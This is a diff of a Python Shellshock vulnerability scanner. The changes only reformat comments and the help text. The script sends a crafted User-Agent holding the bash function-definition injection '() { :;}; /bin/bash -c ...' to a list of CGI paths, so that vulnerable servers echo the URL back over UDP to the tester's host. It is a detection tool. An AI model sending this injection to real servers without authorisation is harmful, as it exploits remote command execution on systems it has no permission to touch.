@@ -3,9 +3,11 @@
 
 '''This script will attempt to identify possible vulnerable CGI scripts on a server
 
-The test is performed by sending a maliciously crafted User-Agent that will instruct the vulnerable machine to echo the URL you are testing back to your system on a port of your choice.
+The test is performed by sending a maliciously crafted User-Agent that will instruct 
+the vulnerable machine to echo the URL you are testing back to your system on a port of your choice.
  
-***This requires that the machine you are testing be able to connect back to you, either via a local network, Public IP, or NAT***
+***This requires that the machine you are testing be able to connect back to you;
+either via a local network, Public IP, or NAT***
 
 Written by Francisco Donoso https://github.com/francisck
 '''
@@ -19,10 +21,8 @@ import threading
 from threading import Thread
 
 def parse_args():
-    p = argparse.ArgumentParser(description=
-        '''
-        Shellshock CGI vulnerably test
-        ''', formatter_class=argparse.RawTextHelpFormatter)
+    p = argparse.ArgumentParser(description='''Shellshock CGI vulnerably test''', 
+    formatter_class=argparse.RawTextHelpFormatter)
 
     p.add_argument('-s', '--server', required=True, help="The IP address or URL of the system you are trying to test no leading HTTP://")
     p.add_argument('-l', '--listen', required=True, help="The interface IP address that should listen on your system")
@@ -410,7 +410,8 @@ CGI_Scripts = ['/',
 '/wwwboard.cgi',
 '/cgi-sys/entropysearch.cgi',
 '/cgi-sys/FormMail-clone.cgi',
-'/wwwboard/wwwboard.cgi'] #This is a list of possibly vulnerable CGI scripts. Will add more as I find them. Most of these paths are from http://shellshock.detectify.com
+'/wwwboard/wwwboard.cgi'] #This is a list of possibly vulnerable CGI scripts. Will add more as I find them. 
+#Most of these paths are from http://shellshock.detectify.com
 def test_socket():
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -442,7 +443,8 @@ def test_socket():
 def check_vuln():
 	for uri in CGI_Scripts:
 		server_test = "http://"+args.server+str(uri)
-		usr_agent = "() { :;}; /bin/bash -c 'echo %s > /dev/udp/%s/%s'" %(server_test,host,port) #create a custom user-agent. It echo the URI we are testing back via UDP to the host and port we specified (the machine you are running the code from) This is then parased by s.recvfrom. 
+		usr_agent = "() { :;}; /bin/bash -c 'echo %s > /dev/udp/%s/%s'" %(server_test,host,port) #create a custom user-agent. 
+		#It echos the URI we are testing back via UDP to the host and port we specified (the machine you are running the code from)
 		try:
 			req = urllib2.Request(server_test, None, {"User-agent" : usr_agent})
 			urllib2.urlopen(req)
